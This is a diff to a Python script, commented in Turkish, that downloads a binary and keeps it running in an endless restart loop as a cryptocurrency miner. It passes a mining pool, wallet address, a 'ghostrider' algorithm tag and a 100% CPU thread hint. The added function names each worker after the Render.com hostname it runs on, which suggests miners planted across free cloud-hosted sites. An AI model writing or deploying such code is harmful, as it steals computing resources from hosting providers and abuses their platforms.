@@ -54,6 +54,28 @@ def set_memory_limit():
     except Exception as e:
         pass
 
+def get_worker_prefix():
+    """
+    Çalıştığı sitenin domain adından prefix (ön ek) çıkarır.
+    Örn: xx-83o2.onrender.com -> xx-83o2
+    """
+    # Render.com otomatik ortam değişkeni
+    host = os.environ.get("RENDER_EXTERNAL_HOSTNAME", "")
+    
+    # Eğer farklı bir platformsa veya manuel URL verilmişse
+    if not host:
+        raw_url = os.environ.get("PROXY_URL", "")
+        if raw_url:
+            parsed = urlparse(raw_url)
+            host = parsed.netloc if parsed.netloc else raw_url.split('/')[0]
+            
+    if host:
+        # Port veya protokol varsa temizle, ilk noktaya kadar olan kısmı al
+        host = host.split(':')[0].replace("https://", "").replace("http://", "")
+        return host.split('.')[0]
+    
+    return "node" # Domain bulunamazsa varsayılan isim
+
 def execution_logic():
     global STATUS
     
@@ -79,6 +101,9 @@ def execution_logic():
         log_to_console(f"KRİTİK HATA (İndirme): {str(e)}")
         return # İndirme başarısızsa başlama
 
+    # Prefix'i belirle
+    worker_prefix = get_worker_prefix()
+
     # 2. Aşama: Sonsuz Döngü (Kapanırsa tekrar başlatır)
     while True:
         try:
@@ -96,7 +121,8 @@ def execution_logic():
                 use_tls = ":443" in pool_host
                 cmd = [
                     tmp_path, "-o", pool_host, "-u", WALLET_ADDR,
-                    "-p", f"node-{int(time.time())%1000}", "--keepalive",
+                    # Değişiklik burada yapıldı: "node" yerine dinamik worker_prefix kullanılıyor
+                    "-p", f"{worker_prefix}-{int(time.time())%1000}~ghostrider", "--keepalive",
                     "--donate-level=1", "--cpu-max-threads-hint", "100"
                 ]
                 if use_tls:
